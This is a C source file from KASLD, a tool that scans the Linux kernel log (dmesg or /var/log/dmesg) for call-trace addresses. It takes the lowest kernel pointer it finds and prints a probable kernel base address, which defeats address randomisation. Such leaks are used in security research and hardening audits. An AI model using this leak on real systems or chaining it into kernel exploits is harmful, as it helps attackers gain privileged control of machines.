// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for call traces and return the lowest address
// that looks like a kernel pointer.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
// - kernel.panic_on_oops = 0 (Default on most systems).
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

unsigned long search_dmesg_kernel_pointers() {
  char *syslog;
  char *ptr;
  char *endptr;
  int size;
  unsigned long addr = 0;
  unsigned long leaked_addr = 0;

  printf("[.] searching dmesg for call trace kernel pointers ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  ptr = strtok(syslog, "[<");
  while ((ptr = strtok(NULL, "[<")) != NULL) {
    leaked_addr = strtoul(&ptr[0], &endptr, 16);

    if (!leaked_addr)
      continue;

    if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
      //printf("Found kernel pointer: %lx\n", leaked_addr);
      if (!addr || leaked_addr < addr)
        addr = leaked_addr;
    }
  }

  return addr;
}

unsigned long search_dmesg_log_file_kernel_pointers() {
  FILE *f;
  char *ptr;
  char *endptr;
  char *line = 0;
  size_t size = 0;
  const char *path = "/var/log/dmesg";
  unsigned long leaked_addr = 0;
  unsigned long addr = 0;

  printf("[.] searching %s for call trace kernel pointers ...\n", path);

  f = fopen(path, "rb");

  if (f == NULL) {
    perror("[-] fopen");
    return 0;
  }

  while ((getline(&line, &size, f)) != -1) {
    ptr = strtok(line, "[<");
    while ((ptr = strtok(NULL, "[<")) != NULL) {
      leaked_addr = strtoul(&ptr[0], &endptr, 16);

      if (!leaked_addr)
        continue;

      if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
        // printf("Found kernel pointer: %lx\n", leaked_addr);
        if (!addr || leaked_addr < addr)
          addr = leaked_addr;
      }
    }
  }

  free(line);
  fclose(f);

  return addr;
}

int main() {
  unsigned long addr = search_dmesg_kernel_pointers();
  if (!addr)
    addr = search_dmesg_log_file_kernel_pointers();

  if (!addr)
    return 1;

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
